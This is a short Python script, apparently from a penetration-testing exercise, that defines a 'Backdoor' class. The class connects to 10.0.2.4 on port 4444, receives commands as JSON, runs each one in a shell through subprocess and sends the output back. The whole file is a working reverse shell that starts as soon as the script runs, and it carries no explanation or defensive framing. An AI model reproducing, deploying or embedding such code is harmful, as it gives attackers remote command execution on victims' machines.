import socket
import subprocess
import json


class Backdoor:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))

    def reliable_send(self, data):
        json_data = json.dumps(data).encode()  # Convert JSON to bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b""  # Use bytes to collect data
        while True:
            try:
                json_data += self.connection.recv(1024)  # Concatenate bytes
                return json.loads(json_data.decode())  # Decode and parse JSON
            except ValueError:
                continue  # Keep receiving if JSON is incomplete

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()  # Command is already decoded
            command_result = self.execute_system_command(command).decode()
            self.reliable_send(command_result)  # Send back the result as JSON


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
